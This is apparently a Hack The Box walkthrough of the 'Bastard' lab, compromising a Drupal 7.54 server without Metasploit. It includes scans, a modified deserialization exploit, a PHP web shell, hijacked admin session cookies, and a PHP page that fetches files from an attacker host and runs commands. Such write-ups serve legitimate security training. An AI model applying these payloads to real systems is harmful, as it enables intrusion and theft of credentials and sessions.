# Hack The Box - Bastard Walkthrough w/o Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Bastard]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.9 -Pn                                  
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-31 03:59 EST
Nmap scan report for 10.10.10.9
Host is up (0.39s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Welcome to Bastard | Bastard
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Microsoft-IIS/7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.86 seconds

```

We get back the following result showing that 3 ports are open:
- Port `80`: running `Microsoft IIS httpd 7.5`.
- Port `135`: running `Microsoft Windows RPC`
- Port `49154`: running `Microsoft Windows RPC`

Before starting enumeration, I ran a more comprehensive scan in the background to make sure that I did not miss anything.

So I ran `Rustscan` that covers all ports.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Bastard]
└─$ rustscan -a 10.10.10.9 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.9:80
Open 10.10.10.9:135
Open 10.10.10.9:49154
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 80,135,49154 10.10.10.9

Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-31 04:14 EST
Initiating Ping Scan at 04:14
Scanning 10.10.10.9 [2 ports]
Completed Ping Scan at 04:14, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:14
Completed Parallel DNS resolution of 1 host. at 04:14, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:14
Scanning 10.10.10.9 [3 ports]
Discovered open port 135/tcp on 10.10.10.9
Discovered open port 49154/tcp on 10.10.10.9
Discovered open port 80/tcp on 10.10.10.9
Completed Connect Scan at 04:14, 0.43s elapsed (3 total ports)
Nmap scan report for 10.10.10.9
Host is up, received syn-ack (0.22s latency).
Scanned at 2023-01-31 04:14:46 EST for 0s

PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack
135/tcp   open  msrpc   syn-ack
49154/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds

```

## Enumeration
Now that port `80` was open, I visited the web-page on port `80`, and found out a `Drupal` page without any content and a login form.

![bas-1](https://user-images.githubusercontent.com/87711310/215762276-b9cfa5f3-d68f-4196-be56-2bc4af07a678.png)

The nmap scan showed me the output of the the `robots.txt` which included a `CHANGELOG.txt`. On checking out the top of that page, I can find the version of Drupal: `7.54`:

I used `cURL` to take a note of it
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Bastard]
└─$ curl -s http://10.10.10.9/CHANGELOG.txt | head

Drupal 7.54, 2017-02-01
-----------------------
- Modules are now able to define theme engines (API addition:
  https://www.drupal.org/node/2826480).
- Logging of searches can now be disabled (new option in the administrative
  interface).
- Added menu tree render structure to (pre-)process hooks for theme_menu_tree()
  (API addition: https://www.drupal.org/node/2827134).
- Added new function for determining whether an HTTPS request is being served
```

Now that I know the website is running `Drupal`, I decided to run `droopescan` to enumerate the site.
NOTE: This scan literally takes forever to complete

```

```


While `droopescan` was runnning in the background, I decided to check `searchsploit`.
```
...[snip]...
Drupal 7.x Module Services - Remote Code Execution                                          | php/webapps/41564.php
...[snip]...
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                    | exploits/php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                 | exploits/php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution         | exploits/php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)     | exploits/php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)            | exploits/php/webapps/44448.py
----------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results                  
```

Before diving into the exploit, I decided to try and find the credentials for the login form of the application.  I googled `default credentials drupal`, but I didn’t find anything useful. Next, I tried common credentials `admin:admin`, `admin:password`, etc. but was not able to log in.

After this, I decided to finally go with searchploit's exploit.
```
searchsploit -m 41564
```

On viewing the exploit, I thought it seemed like a deserialization vulnerability that leads to Remote Code Execution (RCE). Looking at the code, it we see that it visit the path `/rest_endpoint` to conduct the exploit.

```php
$url = 'http://vmweb.lan/drupal-7.54';
$endpoint_path = '/rest_endpoint';
$endpoint = 'rest_endpoint';
```

That path is not found on the box, however, if we simply change it to `/rest` it works

You can simply use `dirbuster` to enumerate the `/rest` directory, for me, I just fuzzed with the name manually and found it out luckily.

![bas-2](https://user-images.githubusercontent.com/87711310/215776888-4be9da82-3d42-4e42-9751-4155debdc25c.png)

So, now I had to make those changes in the exploit and provide the url of htb machine and `/rest` as `endpoint_path`

```php
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';
```

Running the exploit, I get an `Uncaught Error: Call to undefined function curl_init()` error message. That’s because we don’t have `php-curl` installed on our kali machine.

```
apt-get install php-curl
```

Apart from this, I also faced another error, which, when I googled, I saw a lot of users facing the same error on htb forum.

Here, the error.
```
```

And here's how to solve the error.
```
1: apt-get install php-curl
2. install sudo apt install php libapache2-mod-php 
sudo apt install php7.0-mbstring
sudo a2dismod mpm_event
sudo a2enmod mpm_prefork
service apache2 restart
3. a2enmod php7.* ( * your respective php version number will come here) (use `php --vesion`, I had php8 installed, so I used `php8.2`)
4. service apache2 restart
& finally run the php file, it will run successfully without any error
```

I’ll update the script:
```
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'shell.php',
    'data' => '<?php system($_REQUEST["cmd"]); ?>'
];
```

Once you do this with default settings you're good to go.

I ran the `php exploit` and I got back two files: `session.json` & `user.json`

Inside `session.json`, I now have the cookies for the `administrator’s` session:
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Bastard]
└─$ cat session.json                           
{
    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
    "session_id": "6aU_wGmuPAxhA8cWoPhMJmBQ2Ec1QwIs-A2D2c7TxUE",
    "token": "3YgDXSLhiJO0nPFnIjuFNM0AjjOcfoHp1-kIJO0r2Ec"
}                                             
```

I also have information on the users in `user.json`:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Bastard]
└─$ cat user.json   
{
    "uid": "1",
    "name": "admin",
    "mail": "drupal@hackthebox.gr",
    "theme": "",
    "created": "1489920428",
    "access": "1492102672",
    "login": 1675171564,
    "status": "1",
    "timezone": "Europe\/Athens",
    "language": "",
    "picture": null,
    "init": "drupal@hackthebox.gr",
    "data": false,
    "roles": {
        "2": "authenticated user",
        "3": "administrator"
    },
    "rdf_mapping": {
        "rdftype": [
            "sioc:UserAccount"
        ],
        "name": {
            "predicates": [
                "foaf:name"
            ]
        },
        "homepage": {
            "predicates": [
                "foaf:page"
            ],
            "type": "rel"
        }
    },
    "pass": "$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE"
}     
```

I could identify that hash as `Drupal 7`, and try to break it:
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Bastard]
└─$ hashcat -m 7900 admin.hash /usr/share/wordlists/rockyou.txt -o admin.cracked --force 
```

However, that was going to take about three days on my system, and I don’t really need the password at this point.

Most useful, I have a webshell:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Bastard]
└─$ curl http://10.10.10.9/shell.php?cmd=whoami
nt authority\iusr
```

Now, apart from this, I also had `admin's` session cookies, which I'll use to login as an admin on the webpage.

![bas-3](https://user-images.githubusercontent.com/87711310/215776822-60dc7dc5-d856-4351-9c47-bd1d91df1711.png)

Then, on refreshing the page, I was logged in as an `admin`.

![bas-4](https://user-images.githubusercontent.com/87711310/215776836-87a47fa9-3061-45df-b640-cbc4a1314ac5.png)

Click on the `Modules` tab and check if the `PHP filter` is enabled. It is. This means we can add PHP code.

Now, click on `Add new content` on the welcome page > click on `Basic` page. In the Title field add the value `shell`. In the Body field add the simple PHP shell to upload/execute code from the [following link](https://d47zm3.me/resources/infosec/reverse-shells/). Make sure to include the “<?php ?>” tags and change it to the IP address of your attack machine. This gives us the ability to both execute and upload files. In the Text format filed choose the option PHP code. Then hit Save.

![bas-5](https://user-images.githubusercontent.com/87711310/215780145-028100de-4c70-44f6-89b3-44f5c3e76797.png)

The code for getting a reverse shell
```php
<?php if (isset($_REQUEST['fupload'])){
    file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.16.3:9999" .$_REQUEST['fupload']));
};

if(isset($_REQUEST['fexec'])){
    echo "<pre>".shell_exec($_REQUEST['fexec'])."</pre">;
};

?>
```

![bas-6](https://user-images.githubusercontent.com/87711310/215781732-7eec3c91-8650-4532-9485-3d2ed32b0e4d.png)

Now, after saving and visiting `http://ip/node/3?fexec=whoami`, I get the following results:

![bas-7](https://user-images.githubusercontent.com/87711310/215782562-a69d54d3-d8aa-41b3-98d2-6ad891468db9.png)

Using `systeminfo` command, I figured out that it was a `64-bit operating system`. So, now I downloaded the 64-bit executable of netcat from [here](https://eternallybored.org/misc/netcat/).
